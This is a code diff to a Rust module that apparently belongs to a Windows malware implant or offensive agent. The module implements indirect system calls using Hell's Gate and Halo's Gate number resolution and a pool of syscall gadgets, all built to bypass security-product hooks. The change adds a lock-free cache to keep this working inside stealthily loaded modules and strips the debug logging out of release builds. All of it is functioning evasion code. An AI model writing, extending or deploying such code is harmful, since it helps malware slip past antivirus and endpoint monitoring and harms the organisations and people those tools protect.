@@ -11,9 +11,7 @@
 // - Maintain a small rotating pool of `syscall; ret` gadgets (no repeated .text sweeps)
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-use std::collections::HashMap;
-#[cfg(all(windows, target_arch = "x86_64"))]
-use std::sync::atomic::{AtomicUsize, Ordering};
+use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
 #[cfg(all(windows, target_arch = "x86_64"))]
 use std::sync::{Mutex, OnceLock};
 
@@ -36,7 +34,6 @@ const HALO_MAX_NEIGHBORS: usize = 500;
 
 #[cfg(all(windows, target_arch = "x86_64"))]
 struct SyscallState {
-    ssn_cache: HashMap<u32, u16>,
     gadgets: Vec<usize>,
 }
 
@@ -45,12 +42,48 @@ fn syscall_state() -> &'static Mutex<SyscallState> {
     static STATE: OnceLock<Mutex<SyscallState>> = OnceLock::new();
     STATE.get_or_init(|| {
         // Acceptance signal: no eager Nt* SSN scan at startup.
-        crate::utils::db_print("[agent] syscall layer: lazy resolved 0 on init (SSN on-demand)");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] syscall layer: lazy resolved 0 on init (SSN on-demand)");
         Mutex::new(SyscallState {
-            ssn_cache: HashMap::new(),
             gadgets: Vec::with_capacity(MAX_GADGETS),
         })
     })
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// SSN cache: direct-mapped ATOMIC SLOTS (TLS-free, allocation-free, lock-free).
+// Same rationale as stealth::peb::EXPORT_CACHE — std HashMap's RandomState
+// touches a thread_local that AVs under pe_map TLS neutralization in L2
+// modules (TLS_SENTINEL_INDEX = 0x7FFFFFFF → gs:[0x58] walk → 0xC0000005).
+// Slot = hash % SLOTS; value packs (hash << 32) | ssn; tag validated on read.
+// ────────────────────────────────────────────────────────────────────────────
+
+/// SSN cache slots (direct-mapped by syscall-name hash). x64 only.
+#[cfg(all(windows, target_arch = "x86_64"))]
+const SSN_CACHE_SLOTS: usize = 64;
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+static SSN_CACHE: [AtomicU64; SSN_CACHE_SLOTS] = {
+    const ZERO: AtomicU64 = AtomicU64::new(0);
+    [ZERO; SSN_CACHE_SLOTS]
+};
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+#[inline]
+fn ssn_cache_get(hash: u32) -> Option<u16> {
+    let v = SSN_CACHE[(hash as usize) % SSN_CACHE_SLOTS].load(Ordering::Acquire);
+    if (v >> 32) as u32 == hash && (v & 0xFFFF) as u16 != 0xFFFF {
+        Some((v & 0xFFFF) as u16)
+    } else {
+        None
+    }
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
+#[inline]
+fn ssn_cache_put(hash: u32, ssn: u16) {
+    let v = ((hash as u64) << 32) | (ssn as u64);
+    SSN_CACHE[(hash as usize) % SSN_CACHE_SLOTS].store(v, Ordering::Release);
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
@@ -166,17 +199,17 @@ unsafe fn harvest_gadget_pool(state: &mut SyscallState) {
     }
 
     if state.gadgets.is_empty() {
-        crate::utils::db_print("[agent] Gadget pool empty after limited harvest");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] ROP pool empty after limited harvest");
     } else {
-        crate::utils::db_print(&format!(
-            "[agent] Gadget pool ready: {} entries",
+        #[cfg(debug_assertions)]
+        crate::db_print!(
+            "[*] ROP pool ready: {} entries",
             state.gadgets.len()
-        ));
+        );
     }
 }
 
-/// Lazy SSN resolve: cache → clean stub → Halo's Gate neighbors.
-#[cfg(all(windows, target_arch = "x86_64"))]
 /// SizeOfImage for ntdll module (bounds Halo's Gate walk).
 #[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn ntdll_image_size(ntdll_base: usize) -> usize {
@@ -196,12 +229,11 @@ unsafe fn ntdll_image_size(ntdll_base: usize) -> usize {
     }
 }
 
+/// Lazy SSN resolve: cache → clean stub → Halo's Gate neighbors.
+#[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
-    {
-        let state = syscall_state().lock().ok()?;
-        if let Some(&ssn) = state.ssn_cache.get(&hash) {
-            return Some(ssn);
-        }
+    if let Some(ssn) = ssn_cache_get(hash) {
+        return Some(ssn);
     }
 
     let ntdll_base =
@@ -217,8 +249,8 @@ unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
 
     // Hell's Gate: clean stub at target
     if let Some((ssn, gadget)) = extract_ssn_from_stub(api_addr) {
+        ssn_cache_put(hash, ssn);
         if let Ok(mut state) = syscall_state().lock() {
-            state.ssn_cache.insert(hash, ssn);
             remember_gadget(&mut state, gadget);
             if state.gadgets.is_empty() {
                 harvest_gadget_pool(&mut state);
@@ -240,8 +272,8 @@ unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
             }
             if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(down) {
                 let ssn = neigh_ssn.wrapping_sub(i as u16);
+                ssn_cache_put(hash, ssn);
                 if let Ok(mut state) = syscall_state().lock() {
-                    state.ssn_cache.insert(hash, ssn);
                     remember_gadget(&mut state, gadget);
                     if state.gadgets.is_empty() {
                         harvest_gadget_pool(&mut state);
@@ -256,8 +288,8 @@ unsafe fn resolve_ssn(hash: u32) -> Option<u16> {
             }
             if let Some((neigh_ssn, gadget)) = extract_ssn_from_stub(up) {
                 let ssn = neigh_ssn.wrapping_add(i as u16);
+                ssn_cache_put(hash, ssn);
                 if let Ok(mut state) = syscall_state().lock() {
-                    state.ssn_cache.insert(hash, ssn);
                     remember_gadget(&mut state, gadget);
                     if state.gadgets.is_empty() {
                         harvest_gadget_pool(&mut state);
@@ -302,17 +334,19 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
     let ssn = match resolve_ssn(hash) {
         Some(s) => s,
         None => {
-            crate::utils::db_print(&format!(
-                "[agent] SSN not found for 0x{:X}, refusing hooked stub fallback",
+            #[cfg(debug_assertions)]
+            crate::db_print!(
+                "[*] SSN not found for 0x{:X}, refusing hooked stub fallback",
                 hash
-            ));
+            );
             return -1; // STATUS_UNSUCCESSFUL-ish
         }
     };
 
     let gadget = pick_gadget();
     if gadget == 0 {
-        crate::utils::db_print("[agent] No syscall gadget, refusing hooked stub fallback");
+        #[cfg(debug_assertions)]
+        crate::db_print!("[*] No syscall gadget, refusing hooked stub fallback");
         return -1;
     }
 
@@ -421,10 +455,11 @@ pub unsafe fn indirect_syscall(hash: u32, args: &[usize]) -> i32 {
 
     let api_addr = crate::stealth::peb::get_api_addr(ntdll_base, hash).unwrap_or(0);
     if api_addr == 0 {
-        crate::utils::db_print(&format!(
-            "[agent][x86] API not found for hash 0x{:X}",
+        #[cfg(debug_assertions)]
+        crate::db_print!(
+            "[x86] API not found for hash 0x{:X}",
             hash
-        ));
+        );
         return -1;
     }
 
